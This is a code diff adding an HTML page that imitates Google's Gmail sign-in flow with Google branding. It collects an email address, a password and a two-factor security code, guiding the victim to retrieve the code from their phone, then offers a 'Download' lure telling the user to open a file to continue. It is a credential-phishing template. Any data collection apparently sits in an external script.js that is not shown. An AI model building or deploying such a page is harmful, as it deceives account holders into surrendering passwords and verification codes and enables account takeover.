@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Google-Docs</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Google-inspired Login Flow</title>
+  <style>
+    /* Paste the CSS here or link externally */
+  </style>
+</head>
+<body>
+
+  <div id="container">
+
+    <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+
+    <!-- Step 1: Email input -->
+    <div id="step1" class="step">
+      <h1>Sign in</h1>
+      <p>to continue to Gmail</p>
+      <label for="email">Email or phone</label>
+      <input type="email" id="email" placeholder="Enter email or phone" required />
+      <div class="link" id="forgotEmail">Forgot email?</div>
+      <div class="link" style="margin-top: 16px;">
+        Not your computer? Use Guest mode to sign in privately. <br />
+        <a href="#" style="color:#8ab4f8; text-decoration:none;">Learn more about using Guest mode</a>
+      </div>
+      <div class="clearfix">
+        <div class="link" style="float:left; margin-top:20px;">Create account</div>
+        <button class="btn-next" id="toStep2" disabled>Next</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Password input -->
+    <div id="step2" class="step" style="display:none;">
+      <h1>Welcome</h1>
+      <div style="margin-bottom: 20px; font-size:14px; background:#202124; padding:6px 12px; border-radius:24px; width:fit-content;">
+        <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User" style="width:20px; vertical-align:middle; border-radius:50%;" />
+        <span id="emailDisplay" style="margin-left: 8px;">example@gmail.com</span>
+      </div>
+      <label for="password">Enter your password</label>
+      <input type="password" id="password" placeholder="Password" required />
+      <label class="checkbox-label"><input type="checkbox" id="showPassword" /> Show password</label>
+      <div class="link" id="tryAnotherWay">Try another way</div>
+      <button class="btn-next" id="toStep3" disabled>Next</button>
+    </div>
+
+    <!-- Step 3: Verification code input -->
+    <div id="step3" class="step" style="display:none;">
+      <h1>Verify it's you</h1>
+      <p style="font-size:14px; margin-bottom:16px;">To help keep your account secure, Google wants to make sure it's really you.</p>
+      <div style="display:flex; align-items:center; gap:8px; margin-bottom:16px;">
+        <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User" style="width:24px; border-radius:50%;" />
+        <span id="verifyEmail">example@gmail.com</span>
+      </div>
+      <ul id="instructions">
+        <li>Get your Mobile Phone</li>
+        <li>Open the Settings app ⚙️</li>
+        <li>Tap Google</li>
+        <li>Select your account if it is not already selected.</li>
+        <li>Tap Manage your Google Account.</li>
+        <li>Select the Security tab (you may need to scroll right)</li>
+        <li>Under "Signing in to Google," tap <b>Security code</b></li>
+        <li>Choose an account to get your code</li>
+      </ul>
+      <input type="text" id="securityCode" placeholder="Enter the code" required />
+      <div class="link" id="moreWays">More ways to verify</div>
+      <button class="btn-next" id="toStep4" disabled>Next</button>
+    </div>
+
+    <!-- Step 4: Confirmation -->
+<div id="step4" class="step" style="display:none;">
+  <h1>All Done!</h1>
+  <p>Your information has been successfully verified.</p>
+  <button class="btn-next" id="finishBtn">Download</button>
+</div>
+
+<div id="footer">
+  <div>English (United States)</div>
+  <div>
+    <span>Help</span>
+    <span>Privacy</span>
+    <span>Terms</span>
+  </div>
+</div>
+
+<script>
+  document.getElementById('finishBtn').addEventListener('click', function () {
+    // File content
+    const fileContent = 'Thank you! Your file is Downloading, Open the file to continue.';
+
+    // Create a blob
+    const blob = new Blob([fileContent], { type: 'text/plain' });
+
+    // Create a download link
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = 'confirmation.txt';
+
+    // Trigger download
+    link.click();
+
+    // Clean up
+    URL.revokeObjectURL(link.href);
+  });
+</script>
+<!-- partial -->
+  <script  src="./script.js"></script>
+
+</body>
+</html>
